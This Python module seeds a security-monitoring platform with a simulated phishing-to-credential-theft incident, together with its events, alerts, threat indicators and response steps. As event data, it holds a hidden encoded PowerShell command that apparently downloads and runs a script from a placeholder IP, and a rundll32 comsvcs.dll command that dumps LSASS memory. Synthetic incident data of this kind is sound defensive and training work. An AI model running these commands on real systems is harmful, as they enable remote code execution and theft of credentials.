import uuid
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session

from app.models.event import SecurityEvent
from app.models.alert import Alert
from app.models.incident import Incident
from app.models.indicator import Indicator


def generate_synthetic_attack_scenario(db: Session, tenant_id: str = "tenant_default") -> Dict[str, Any]:
    now = datetime.now(timezone.utc)
    
    # 1. Synthetic Security Events
    events_raw = [
        {
            "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
            "timestamp": (now - timedelta(minutes=45)).isoformat(),
            "source": "email_gateway",
            "event_type": "phishing_delivery",
            "severity": "medium",
            "user": "victim.user@enterprise.com",
            "src_ip": "198.51.100.22",
            "dst_ip": "10.0.4.15",
            "domain": "phish-payroll-update.net",
            "hostname": "WORKSTATION-089",
            "raw_data": "Inbound email containing suspicious link: http://phish-payroll-update.net/login.php delivered to victim.user@enterprise.com"
        },
        {
            "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
            "timestamp": (now - timedelta(minutes=30)).isoformat(),
            "source": "edr",
            "event_type": "process_creation",
            "severity": "high",
            "user": "victim.user@enterprise.com",
            "hostname": "WORKSTATION-089",
            "src_ip": "10.0.4.15",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0dHA6Ly8xOTguNTEuMTAwLjQ0L3BheWxvYWQucHMxJycp",
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "raw_data": "Encoded PowerShell execution spawned by WINWORD.EXE on WORKSTATION-089"
        },
        {
            "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
            "timestamp": (now - timedelta(minutes=25)).isoformat(),
            "source": "edr",
            "event_type": "credential_dump",
            "severity": "critical",
            "user": "SYSTEM",
            "hostname": "WORKSTATION-089",
            "src_ip": "10.0.4.15",
            "process_name": "lsass.exe",
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
            "raw_data": "lsass process memory read detected originating from process rundll32.exe"
        },
        {
            "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
            "timestamp": (now - timedelta(minutes=15)).isoformat(),
            "source": "dns",
            "event_type": "dns_query",
            "severity": "medium",
            "user": "victim.user@enterprise.com",
            "hostname": "WORKSTATION-089",
            "src_ip": "10.0.4.15",
            "domain": "c2-command-node.ru",
            "raw_data": "High entropy DNS resolution query for c2-command-node.ru"
        },
        {
            "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
            "timestamp": (now - timedelta(minutes=10)).isoformat(),
            "source": "firewall",
            "event_type": "network_conn",
            "severity": "high",
            "user": "victim.user@enterprise.com",
            "hostname": "WORKSTATION-089",
            "src_ip": "10.0.4.15",
            "dst_ip": "198.51.100.44",
            "dst_port": 443,
            "raw_data": "Outbound TLS connection to suspicious external IP 198.51.100.44:443 with self-signed certificate"
        }
    ]

    created_events = []
    created_event_ids = []
    for item in events_raw:
        evt = SecurityEvent(
            id=f"evt_sim_{uuid.uuid4().hex[:10]}",
            event_id=item["event_id"],
            timestamp=datetime.fromisoformat(item["timestamp"]),
            source=item["source"],
            event_type=item["event_type"],
            severity=item["severity"],
            src_ip=item.get("src_ip"),
            dst_ip=item.get("dst_ip"),
            dst_port=item.get("dst_port"),
            domain=item.get("domain"),
            user=item.get("user"),
            process_name=item.get("process_name"),
            command_line=item.get("command_line"),
            file_hash=item.get("file_hash"),
            hostname=item.get("hostname"),
            raw_data=item["raw_data"],
            metadata_json={"simulated_scenario": "Phishing to LSASS Dump and C2"},
            tenant_id=tenant_id,
            is_simulated="true"
        )
        db.add(evt)
        created_events.append(evt)
        created_event_ids.append(evt.id)

    # 2. Synthetic Alerts
    alert_1 = Alert(
        id=f"alt_sim_{uuid.uuid4().hex[:10]}",
        title="Suspicious Obfuscated PowerShell Execution",
        description="Encoded PowerShell script spawned by Office binary WINWORD.EXE downloading external payload.",
        severity="high",
        status="new",
        source="edr",
        rule_name="EDR_RULE_POWERSHELL_ENC",
        event_ids=[created_event_ids[1]],
        asset_id="WORKSTATION-089",
        tenant_id=tenant_id,
        is_simulated="true"
    )
    alert_2 = Alert(
        id=f"alt_sim_{uuid.uuid4().hex[:10]}",
        title="Potential LSASS Credential Dumping via Comsvcs",
        description="Process comsvcs.dll attempted to generate minidump of lsass.exe process memory.",
        severity="critical",
        status="new",
        source="edr",
        rule_name="EDR_RULE_LSASS_DUMP",
        event_ids=[created_event_ids[2]],
        asset_id="WORKSTATION-089",
        tenant_id=tenant_id,
        is_simulated="true"
    )
    alert_3 = Alert(
        id=f"alt_sim_{uuid.uuid4().hex[:10]}",
        title="Outbound C2 Beaconing to Known Malicious IP",
        description="WORKSTATION-089 established outbound TLS connection to high-risk IP 198.51.100.44.",
        severity="high",
        status="new",
        source="firewall",
        rule_name="FW_RULE_C2_OUTBOUND",
        event_ids=[created_event_ids[3], created_event_ids[4]],
        asset_id="WORKSTATION-089",
        tenant_id=tenant_id,
        is_simulated="true"
    )

    db.add_all([alert_1, alert_2, alert_3])

    # 3. Synthetic Indicators
    ind_ip = Indicator(
        id=f"ind_sim_{uuid.uuid4().hex[:10]}",
        indicator_value="198.51.100.44",
        indicator_type="ip",
        reputation_score=88.5,
        risk_level="high",
        threat_actor="APT-29 Sim",
        source_attribution="VirusTotal / ThreatFox",
        raw_enrichment={"positives": 42, "total": 70, "tags": ["c2", "cobalt-strike"]},
        confidence=0.95,
        tenant_id=tenant_id
    )
    ind_domain = Indicator(
        id=f"ind_sim_{uuid.uuid4().hex[:10]}",
        indicator_value="c2-command-node.ru",
        indicator_type="domain",
        reputation_score=92.0,
        risk_level="critical",
        threat_actor="APT-29 Sim",
        source_attribution="AlienVault OTX",
        raw_enrichment={"pulse_count": 14, "tags": ["phishing", "c2"]},
        confidence=0.98,
        tenant_id=tenant_id
    )
    db.add_all([ind_ip, ind_domain])

    # 4. Synthetic Incident
    incident = Incident(
        id=f"inc_sim_{uuid.uuid4().hex[:10]}",
        title="[Simulated] Multi-Stage Credential Theft & Outbound C2 on WORKSTATION-089",
        description="Guided demonstration incident: Phishing delivery followed by obfuscated PowerShell payload, LSASS memory dump, and active TLS C2 beaconing.",
        severity="critical",
        status="investigating",
        alert_ids=[alert_1.id, alert_2.id, alert_3.id],
        indicator_ids=[ind_ip.id, ind_domain.id],
        mitre_techniques=["T1059.001", "T1003.001", "T1071.001"],
        timeline_json=[
            {
                "timestamp": (now - timedelta(minutes=45)).isoformat(),
                "event_type": "phishing_delivery",
                "title": "Phishing Link Delivered",
                "description": "User received email with link http://phish-payroll-update.net/login.php",
                "severity": "medium",
                "source": "email_gateway"
            },
            {
                "timestamp": (now - timedelta(minutes=30)).isoformat(),
                "event_type": "process_creation",
                "title": "Encoded PowerShell Spawned",
                "description": "WINWORD.EXE launched obfuscated powershell.exe script.",
                "severity": "high",
                "source": "edr"
            },
            {
                "timestamp": (now - timedelta(minutes=25)).isoformat(),
                "event_type": "credential_dump",
                "title": "LSASS Memory Dump Attempted",
                "description": "rundll32.exe comsvcs.dll dumping LSASS memory to C:\\Windows\\Temp\\lsass.dmp",
                "severity": "critical",
                "source": "edr"
            },
            {
                "timestamp": (now - timedelta(minutes=10)).isoformat(),
                "event_type": "network_conn",
                "title": "Outbound TLS C2 Beaconing",
                "description": "Active socket connection established to 198.51.100.44:443",
                "severity": "high",
                "source": "firewall"
            }
        ],
        recommendations_json=[
            {
                "category": "response",
                "title": "Isolate WORKSTATION-089 from Network",
                "description": "Isolate WORKSTATION-089 immediately via EDR agent to prevent lateral movement.",
                "priority": "high",
                "requires_approval": True
            },
            {
                "category": "response",
                "title": "Reset victim.user@enterprise.com Credentials",
                "description": "Force password reset and revoke active SSO session tokens.",
                "priority": "high",
                "requires_approval": True
            },
            {
                "category": "investigative",
                "title": "Block Indicator 198.51.100.44 on Perimeter Firewall",
                "description": "Add 198.51.100.44 and c2-command-node.ru to egress blocklists.",
                "priority": "medium",
                "requires_approval": False
            }
        ],
        tenant_id=tenant_id,
        is_simulated="true"
    )

    db.add(incident)
    db.commit()

    return {
        "incident_id": incident.id,
        "alerts_count": 3,
        "events_count": 5,
        "indicators_count": 2,
        "is_simulated": True
    }
